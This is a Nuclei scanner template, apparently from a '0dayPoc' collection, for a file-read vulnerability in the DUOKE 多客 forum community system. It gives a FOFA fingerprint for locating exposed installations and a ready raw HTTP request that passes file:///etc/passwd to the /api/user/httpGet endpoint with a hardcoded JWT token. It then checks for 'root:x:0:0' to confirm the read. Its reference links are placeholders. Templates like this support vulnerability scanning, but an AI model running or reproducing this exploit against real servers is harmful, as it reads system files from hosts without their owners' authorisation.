id: duoke-forum-lfi

info:
  name: DUOKE多客圈子论坛社区系统 文件读取漏洞
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: "/static/index/js/jweixin-1.2.0.js"
      DUOKE多客圈子论坛社区系统为基于PHP构建的多端交互平台，支持小程序授权登录、移动端访问及内容管理功能。该系统存在文件读取漏洞，攻击者可通过特定路径遍历方式获取服务器文件内容。
      reference: 
        - https://example.com/reference1
        - https://example.com/reference2
  tags: DUOKE多客圈子论坛社区系统

http:
- raw:
  - |
    GET /api/user/httpGet?url=file:///etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Accept-Encoding: gzip, deflate
    Proxy-Connection: keep-alive
    token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.VQtQaEk7rvMOGHV5dBlNjWpWtBL-gFNpKBMNXTX3_ns
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'root:x:0:0'
